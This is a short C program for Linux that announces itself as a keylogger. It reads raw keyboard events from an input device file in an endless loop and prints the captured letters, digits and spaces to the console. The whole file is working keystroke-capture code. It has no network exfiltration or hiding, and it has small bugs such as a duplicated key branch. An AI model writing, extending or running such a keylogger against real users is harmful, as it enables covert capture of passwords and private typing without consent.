#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <linux/input.h>

int main(int argc, char *argv[]){
    if(argc != 2){
        printf("usage: %s <event-file>\n", argv[0]);
        exit(-1);
    }
    printf("keylogger active ...\n");


    int fd = open(argv[1], O_RDONLY, 0);
    printf("opened fd: %d\n", fd);
    struct input_event ie;


    while(1){
        read(fd, &ie, sizeof(ie));
        if(ie.type != EV_KEY) continue;
        if(ie.value != 1) continue;
        if(ie.code >= 2 && ie.code <=10){
            printf("key pressed: %d", ie.code-1);

        }else if (ie.code ==11){
            printf("0");
        }else if (ie.code == KEY_A){
            printf("A");
        }else if (ie.code == KEY_B){
            printf("B");
        }else if (ie.code == KEY_C){
            printf("C");
        }else if (ie.code == KEY_C){
            printf("C");
        }else if (ie.code == KEY_D){
            printf("D");
        }else if (ie.code == KEY_E){
            printf("E");
        }else if (ie.code == KEY_F){
            printf("F");
        }else if (ie.code == KEY_G){
            printf("G");
        }else if (ie.code == KEY_H){
            printf("H");
        }else if (ie.code == KEY_I){
            printf("I");
        }else if (ie.code == KEY_J){
            printf("J");
        }else if (ie.code == KEY_K){
            printf("K");
        }else if (ie.code == KEY_L){
            printf("L");
        }else if (ie.code == KEY_M){
            printf("M");
        }else if (ie.code == KEY_N){
            printf("N");
        }else if (ie.code == KEY_O){
            printf("O");
        }else if (ie.code == KEY_P){
            printf("P");
        }else if (ie.code == KEY_Q){
            printf("Q");
        }else if (ie.code == KEY_R){
            printf("R");
        }else if (ie.code == KEY_S){
            printf("S");
        }else if (ie.code == KEY_T){
            printf("T");
        }else if (ie.code == KEY_U){
            printf("U");
        }else if (ie.code == KEY_V){
            printf("V");
        }else if (ie.code == KEY_W){
            printf("W");
        }else if (ie.code == KEY_X){
            printf("X");
        }else if (ie.code == KEY_Y){
            printf("Y");
        }else if (ie.code == KEY_Z){
            printf("Z");
        }else if(ie.code == KEY_SPACE){
            printf(" ");
        }
        else{
            printf("unknown key pressed ... code = %d\n", ie.code);
        }
        fflush(stdout);
        // printf("key pressed: %d\n", ie.code);
    }
}